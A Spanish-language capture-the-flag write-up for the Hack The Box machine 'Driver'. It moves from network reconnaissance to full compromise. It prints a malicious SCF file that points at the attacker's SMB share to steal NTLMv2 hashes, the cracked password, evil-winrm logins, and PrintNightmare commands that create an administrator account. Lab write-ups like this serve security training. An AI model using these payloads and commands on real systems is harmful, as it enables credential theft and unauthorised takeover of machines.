----
- Tags: #hash-NTLMv2 #SCF-FILE #smbserver #john #WinRM #evil-winrm #winpeas #netexec 
-----
# Resolución

-----
> En esta máquina se abusa de la subida de un archivo SCF (Windows Shell Command File) que será revisado por un superior de un servicio HTTP, de esta forma se obtendrán las credenciales de dicho usuario, estas nos permitirán autenticarnos a través del servicio WinRM que corre por el puerto 5985. Para esta autenticación usaremos la herramienta evil-winrm que nos brindará una consola interactiva.
> En la Escalada de Privilegios hacia el usuario root abusamos de un servicio llamado spoolsv a través de una vulnerabilidad conocida llamada PrintNightmare, esta vulnerabilidad abusa del servicio de cola de impresión de Windows, específicamente el servicio **"Print Spooler"**, para permitir la ejecución remota de código (RCE) o la escalada de privilegios en sistemas vulnerables.
------

## Reconocimiento

### OS

**WINDOWS**
```bash
ping -c 1 10.10.11.106
PING 10.10.11.106 (10.10.11.106) 56(84) bytes of data.
64 bytes from 10.10.11.106: icmp_seq=1 ttl=127 time=257 ms

--- 10.10.11.106 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 256.910/256.910/256.910/0.000 ms
```

-------
### NMAP

**Puertos**
```ruby
# Nmap 7.94SVN scan initiated Thu Dec 19 17:25:54 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN allPorts 10.10.11.106
Nmap scan report for 10.10.11.106
Host is up, received user-set (0.25s latency).
Scanned at 2024-12-19 17:25:54 -03 for 26s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
135/tcp  open  msrpc        syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127
7680/tcp open  pando-pub    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec 19 17:26:20 2024 -- 1 IP address (1 host up) scanned in 26.78 seconds
```

**Servicios**
```python
# Nmap 7.94SVN scan initiated Thu Dec 19 17:28:44 2024 as: nmap -sCV -p80,135,445,5985,7680 -oN services 10.10.11.106
Nmap scan report for 10.10.11.106
Host is up (0.25s latency).

PORT     STATE    SERVICE      VERSION
80/tcp   open     http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open     msrpc        Microsoft Windows RPC
445/tcp  open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp filtered pando-pub
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-20T03:28:45
|_  start_date: 2024-12-20T03:23:26
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h59m47s, deviation: 0s, median: 6h59m47s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 19 17:29:35 2024 -- 1 IP address (1 host up) scanned in 50.98 seconds
```

---
### Whatweb

```ruby
whatweb 10.10.11.106
http://10.10.11.106 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.106], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]
```

-------
### Netexec (``Crackmapexec Upgraded``)

```bash
netexec smb 10.10.11.106 --shares
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [-] Error enumerating shares: [Errno 32] Broken pipe
```

--------
### SMBMAP

```bash
smbmap -H 10.10.11.106 -u "null"
[!] Authentication error on 10.10.11.106
```

--------
### SMBCLIENT

```bash
smbclient -L 10.10.11.106 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

----
## Explotación

### Explotación con archivo SCF File a través del servicio HTTP

Dentro del servicio HTTP que corre por el **puerto 80** podremos autenticarnos utilizando las credenciales ``admin:admin``, luego encontraremos una sección llamada **``Firmware Updates``** que nos permitirá subir un archivo que por lo que nos indican será **revisado** por un superior para el chequeo. En estos casos no es aplicable el uso de etiquetas para robar cookies ya que no hay un ataque de tipo inyección XSS, la única opción que es viable es la **subida** de un **archivo malicioso SCF File**.

Los archivos **SCF** (Windows Shell Command File) pueden ser **manipulados** para incluir instrucciones que apunten a un **ícono externo**, ubicado en un servidor remoto. Al abrir o interactuar con este archivo, el sistema intenta cargar el ícono especificado, lo que puede generar una solicitud de autenticación hacia un servidor **SMB remoto** bajo nuestro control. Durante este proceso, se envía el hash **NTLMv2** del usuario que ejecuta la acción.
El hash **NTLMv2** es una representación cifrada de las credenciales del usuario y es el formato criptográfico estándar en sistemas Windows para gestionar autenticaciones. Este hash puede ser capturado por el atacante y, en algunos casos, descifrado para revelar la contraseña en texto plano.

------

Para **crear** nuestro archivo **SCF** nos apoyaremos del siguiente [blog](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

**``data.scf``**
```shell
[Shell]
Command=2
IconFile=\\10.10.14.21\share\no-existe-este-icono.ico
[Taskbar]
Command=ToggleDesktop
```

De esta manera simplemente montamos un **servidor SMB** y subimos el archivo esperando que el supervisor lo abra para recibir su **Hash**.

- **``impacket-smbserver smbFolder $(pwd) -smb2support``**

![[Imagenes/Driver/D 1.png]]

De esta forma podríamos intentar crackear dicho hash para obtener la contraseña.

Para crackear la contraseña utilizaremos **``john``** con el diccionario de ``rockyou.txt``. Para esto crearemos un archivo llamado **``hash``** con el contenido completo del Hash que obtuvimos.

**``hash``**
```
tony::DRIVER:aaaaaaaaaaaaaaaa:8705fc42d93578a0c2fcb6f4a5fcb8a7:010100000000000080a0afd96252db0171f8878f49ad03de0000000001001000760078007200450068006800740057000300100076007800720045006800680074005700020010004500520046004e007700520064006f00040010004500520046004e007700520064006f000700080080a0afd96252db0106000400020000000800300030000000000000000000000000200000115e76a6b26a14e5d702fb0d64a93def1ef9c7a52a173029cb6f5cbd21c0adfe0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000
```

Luego pasaremos dicho archivo a la herramienta.

- **``john -w:/usr/share/wordlists/rockyou.txt hash``**

![[Imagenes/Driver/D 2.png]]

La contraseña del usuario sería **``tony:liltony``** por lo tanto podemos autenticarnos.

------
### WINRM Authentication a través de ``evil-winrm``

Previamente a través del escaneo con ``nmap`` detectamos que el **puerto 5985** estaba abierto, este puerto corresponde por defecto a **``WinRM``** que se utiliza para comunicarse con un equipo remoto, por lo tanto primero verificaremos que las credenciales sean válidas con **``netexec``**, recordemos que esta herramienta es idéntica a **``crackmapexec``** y si todo es correcto nos autenticaremos.

- **``netexec smb 10.10.11.106 -u tony -p liltony``**

![[Imagenes/Driver/D 3.png]]

El **``[+]``** indica que son válidas, por lo tanto la credencial es correcta. Como vimos que **``WinRM``** estaba habilitado probaremos autenticarnos con estas mismas credenciales a ese servicio.

- **``netexec winrm 10.10.11.106 -u tony -p liltony``**

Si el ``netexec`` nos indicara "*PWNED*", significaría que son válidas para ``WinRM`` por lo tanto simplemente deberíamos autenticarnos con **``evil-winrm``**.

![[Imagenes/Driver/D 4.png]]

Por lo tanto nos autenticamos con la herramienta **``evil-winrm``**

`Evil-WinRM` es una herramienta muy útil en pruebas de penetración enfocadas en sistemas Windows, especialmente en tareas relacionadas con la post-explotación. Su propósito principal es proporcionar un **cliente interactivo** para conectarse a máquinas **Windows** que tienen habilitado el servicio **Windows Remote Management (WinRM)**.

- **``evil-winrm -i 10.10.11.106 -u tony -p liltony``**

De esta forma ganaríamos acceso a la máquina.

![[Imagenes/Driver/D 5.png]]

-----
## Escalada de Privilegios

Una vez ganamos acceso a la máquina como el usuario **``Tony``** reclamamos la flag y luego comenzamos con la escalada hacia el usuario **``root``**.

------
### Escalada al usuario ``ROOT``

Lo que vamos a hacer como siempre es subir el script de **``winPEASx64.exe``** para realizar un reconocimiento del sistema, esto lo podemos hacer fácilmente ya que **``evil-winrm``** permite subir archivos de forma rápida con **``upload``** especificando la ruta en donde se encuentra el mismo.

- **``upload /home/c4sp/Desktop/Hack-the-Box/Machines/Easy/Driver-Easy/scripts/winPEASx64.exe``**

Luego lo ejecutamos de la siguiente forma.

- **``.\winPEASx64.exe``**

Si prestamos atención al análisis de la herramienta veremos que hay un servicio corriendo llamado **``spoolsv``**. 
Tenemos que entender que ``spool`` es una función del sistema operativo que permite almacenar temporalmente los trabajos de impresión en un ordenador para que la impresora los procese a su propio ritmo, por lo tanto podemos intuir que como la web del servicio HTTP era sobre impresoras la cosa viene por acá.

Buscamos por Github *``spoolsv github``* y encontramos un [repositorio](https://github.com/calebstewart/CVE-2021-1675) que contiene una vulnerabilidad llamada **``PrintNightmare``** que nos servirá, por lo tanto lo descargamos con **``wget``** y lo pasamos con la siguiente sintaxis a la máquina víctima.

-----

Esta vulnerabilidad crea un usuario con privilegios de administrador aprovechándose del servicio ``spoolsv``.

- **``upload <ruta/donde/este/el/script>``**

Ahora simplemente seguimos los siguientes pasos.

- ``Import-Module .\cve-2021-1675.ps1`` (Si nos indica que los privilegios de ejecución están restringidos debemos hacer un **``set-ExecutionPolicy bypass process``**)
- ``Invoke-Nightmare -DriverName "Xerox" -NewUser "c4sp" -NewPassword "c4sp"``

Luego verificamos con ``net user`` que el usuario se creo correctamente.

![[Imagenes/Driver/D 6.png]]

Ahora simplemente nos conectamos con **``netexec``** a través de **``evil-winrm``** pero con el nuevo usuario que hemos creado. ``c4sp:c4sp``

- **``evil-winrm -i 10.10.11.106 -u c4sp -p c4sp``**

![[Imagenes/Driver/D 7.png]]

De esta forma ya seríamos usuario **``root``** por lo tanto reclamaríamos la flag y por lo tanto completaríamos la máquina.












